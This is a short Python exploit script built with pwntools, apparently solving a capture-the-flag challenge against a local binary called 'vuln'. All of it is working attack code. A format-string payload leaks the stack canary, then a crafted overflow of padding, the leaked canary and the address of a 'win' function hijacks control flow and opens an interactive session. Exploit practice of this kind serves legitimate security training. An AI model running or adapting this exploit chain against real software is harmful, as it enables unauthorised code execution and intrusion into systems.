from pwn import *

context.binary = './vuln'
#context.log_level = 'debug'

p = remote('localhost', 9001)
#p = process('./vuln')

p.recvuntil(b"Anyways, what's your name?")

payload1 = b'%15$p'
p.sendline(payload1)

output = p.recvuntil(b", such a beautiful name! I hope you're not a hacker... Are you?", timeout=2)

canary_str = output.split(b', such a beautiful name!')[0].strip()
canary_leak = int(canary_str, 16)
log.success(f"Canary leaked: {hex(canary_leak)}")

elf = context.binary
win_address = elf.symbols['win']
log.info(f"Win function at: {hex(win_address)}")

buf_size = 72
padding = b'A' * buf_size
canary = p64(canary_leak)

payload2 = padding      
payload2 += canary       
payload2 += b'B' * 8     
payload2 += p64(win_address)  

p.send(payload2)

p.interactive()